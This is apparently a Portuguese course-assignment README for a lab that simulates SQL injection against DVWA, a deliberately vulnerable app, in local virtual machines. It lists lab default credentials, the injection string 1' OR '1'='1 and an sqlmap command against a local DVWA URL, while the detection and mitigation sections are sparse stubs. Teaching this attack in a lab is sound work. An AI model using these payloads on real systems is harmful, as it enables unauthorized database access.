# Injeção de SQL com DVWA

Trabalho Prático 2 - Segurança e Auditoria em Sistemas - Ataques a Sistemas Computacionais

## Objetivo

Simular um ataque de injeção de SQL em uma aplicação web vulnerável e identificar como detectar e mitigar a falha.

## Preparação do Ambiente

- qemu
- arch linux
- dvwa
- git
- php
- mariadb
- apache
- openssh

## Credencias das Máquinas Virtuais

`ssh -p 2022 seg@127.0.0.1`

`ssh -p 3022 seg@127.0.0.1`

usuário: `seg`

senha: `seg`

## Configuração do DVWA

`http://localhost:2080/dvwa`

usuário: `admin`

senha: `password`

## Execução do Ataque

`1' OR '1'='1`

`sqlmap -u "http://10.0.2.2:2080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxxx" --dbs`

## Detecção e Auditoria

`/var/log/httpd`

## Mitigação da Falha

`High`

## Evidências e Documentação

## Referências

- [QEMU](https://wiki.archlinux.org/title/QEMU)
- [Apache HTTP Server](https://wiki.archlinux.org/title/Apache_HTTP_Server)
- [MariaDB](https://wiki.archlinux.org/title/MariaDB)
- [PHP](https://wiki.archlinux.org/title/PHP)
